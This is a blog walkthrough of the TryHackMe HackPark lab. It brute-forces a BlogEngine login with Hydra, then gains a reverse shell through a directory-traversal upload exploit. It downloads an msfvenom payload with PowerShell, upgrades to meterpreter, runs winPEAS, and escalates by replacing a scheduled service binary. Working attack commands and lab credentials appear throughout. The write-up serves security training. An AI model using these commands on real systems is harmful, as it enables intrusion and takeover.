---
layout: md
title: TryHackMe HackPark room
description: 
tags: ['security', 'tryhackme']
categories: ['linux', 'security', 'thm']
---

{% include project-headers.html %}

Includes:
  - Windows
  - Hydra 
    - brute forcing credentials
  - Web application exploits
    - File inclusion
    - Directory traversal
  - WinPEAS
  - Metasploit
    - Stabilizing shells
  - Privilege Escalation

We can browse to the server via the internet to find a blog called `BlogEngine`. From here we can find a login page & can use hydra to try and exploit this.

#### Hydra

Try to login using random credentials & capture the body of the post request and note and changes on the page that would indicate a failed login.

Using this information we can create a quick bash script to run a bruteforce hydra attack against the web form - using the post body as `$form` and replacing the username and password with `^USER^` & `^PASS^` for hydra to replace these with the values we give it to run through. And use 'Login failed' as our failure condition.

```bash
#!/bin/bash

form="__VIEWSTATE=<redacted-for-clarity>&__EVENTVALIDATION=<redacted-for-clarity>&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in"

hydra -vV -l admin -P /usr/share/wordlists/rockyou.txt \
10.10.186.90 http-post-form \
"/Account/login.aspx?ReturnURL=/admin/:$form:F=Login failed"
```

After about 30s we find the password and can now login.

#### Exploiting `BlogEngine`

Using `searchsploit` to find exploits:
```bash
$> searchsploit blogengine

BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs
```

Mirror the exploit file:
```
$> searchsploit -m aspx/webapps/46353.cs
```

This file has a detailed overview at the top with how to go about using the exploit to gain remote access. The key details are:
- File must be uploaded as PostView.ascx
- Change the address and port in the script to the lhost and lport
- Upload via '/admin/app/editor/editpost.cshtml'
- Navigate to '/?theme=../../App_Data/files' to run the file

Running the file will give a reverse shell to our listener.

#### Enumerating

The shell we have is quite unstable so I want to stabilize it by creating a meterpreter shell via metasploit.

Craft our reverse shell using `msfvenom`:
```bash
$> msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o msfvenom_reverse_shell.exe
```

Using our reverse shell we can grab the file from our server (using `python3 -m http.server`):
```powershell
cmd> powershell.exe -c "wget 'http://<ip>:8000/msfvenom_reverse_shell.exe' -OutFile 'C:\Users\Public\msfvenom_reverse_shell.exe'"
```

Create a listener on metasploit:
```bash
msf6> use exploit/multi/handler 
msf6> set payload windows/x64/shell/reverse_tcp
msf6> set lhost <ip>
msf6> set lport <port>
msf6> exploit
```

And the we can run our reverse shell:
```cmd
cmd> C:\Users\Public\msfvenom_reverse_shell.exe
```
& background the session `ctrl+z`

Upgrading to meterpreter:
```bash
msf6> use post/multi/manage/shell_to_meterpreter
msf6> sessions -l
msf6> set session <reverse-shell-session-id>
msf6> set lhost 10.9.7.128
msf6> set lport 4433
msf6> exploit
msf6> session -i <meterpreter-session-id>

meterpreter>
```
* I did notice the meterpreter/PS shell is still slightly unstable and likes to die from time to time. Keeping the original session around as a backup was handy.

Uploading and running `winPEAS`:
```
meterpreter> upload winPEASx86.exe
meterpreter> load powershell
meterpreter> powershell_shell

PS> .\winPEASx86.exe > winpeas.txt
PS> exit
PS> meterpreter > download winpeas.txt
```

Read/search the results:
```bash
more winpeas.txt
cat winpeas.txt | grep -i "<search>"
```
`more` is nice for this as it will use the shell syntax highlighting/colours, making it easier to read. The file is often extremely long and hard to read using `cat` or similar.  

This highlights a possibly vulnerable service:
```
=================================================================================================

WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
File Permissions: Everyone [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
System Scheduler Service Wrapper
=================================================================================================
```

It also finds some AutoLogon credentials:
```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs
```

#### Privilege escalation

The hackpark room wants us to exploit the service, so I will ignore the AutoLogon credentials.

Looking through the logs in `C:\Program Files (x86)\SystemScheduler` we can see its calling `Message.exe` as administrator. We can use our `msfvenom_reverse_shell.exe` we created earlier to gain a more stable reverse shell to replace `Message.exe`, and on the next scheduler cycle it will be run as an `Administrator`. 

Restart the listener we had earlier & wait for the next cycle (seems to be once every 1-2 minutes). This will give us a reverse shell as the `Administrator` account. From here we can gather the flags on both desktops and we've already ran `winPEAS` and gathered the other required information. 
